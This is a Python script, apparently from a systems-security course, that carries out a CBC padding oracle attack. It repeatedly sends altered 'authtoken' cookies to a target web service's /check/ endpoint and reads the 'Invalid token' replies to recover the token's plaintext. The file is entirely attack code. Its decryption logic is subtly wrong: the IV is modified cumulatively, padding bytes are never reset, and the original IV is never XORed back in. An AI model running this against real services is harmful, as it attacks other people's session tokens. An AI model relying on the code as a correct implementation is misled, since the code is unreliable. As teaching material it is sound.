#!/usr/bin/env python3

# CBC padding oracle attack
# - lenerd

import requests
import sys

def test_systems_security(base_url):
    res = requests.get(f'{base_url}/', verify="ca.pem")
    ciphertext = bytes.fromhex(res.cookies['authtoken'])
    print(f'[+] received ciphertext: {ciphertext.hex()}')
    res = requests.get(f'{base_url}/check/', cookies={'authtoken': ciphertext.hex()}, verify="ca.pem")
    print(f'[+] done:\n{res.text}')

def cdb_padding_oracle_attack(base_url):
    res = requests.get(f'{base_url}/', verify="ca.pem")
    ciphertext = bytes.fromhex(res.cookies['authtoken'])
    print(f'[+] received ciphertext: {ciphertext.hex()}')
    iv = ciphertext[:16]
    ciphertext = ciphertext[16:]
    plaintext = b'' # Empty byte-string.
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16]
        plaintext += cdb_padding_oracle_attack_block(base_url, iv, block)
        iv = block
    print(f'[+] done:\n{plaintext}')


def cdb_padding_oracle_attack_block(base_url, iv, block):
    plaintext = b''
    for i in range(16):
        # We know the last byte of the plaintext.
        # We can brute-force the last byte of the ciphertext.
        # We can then check if the padding is correct.
        # If the padding is correct, we know the last byte of the plaintext.
        # We can then repeat the process for the second last byte of the plaintext.
        # We can then repeat the process for the third last byte of the plaintext.
        # ...
        for j in range(256):
            iv = iv[:16-i-1] + bytes([j]) + iv[16-i:]
            res = requests.get(f'{base_url}/check/', cookies={'authtoken': iv.hex() + block.hex()}, verify="ca.pem")
            if 'Invalid token' not in res.text:
                plaintext = bytes([j ^ (i+1)]) + plaintext
                for k in range(i):
                    plaintext = bytes([plaintext[0] ^ (i+1)]) + plaintext[1:]
                break
    return plaintext

""" if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    cdb_padding_oracle_attack(sys.argv[1]) """

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    # test_systems_security(sys.argv[1]) 
    cdb_padding_oracle_attack(sys.argv[1])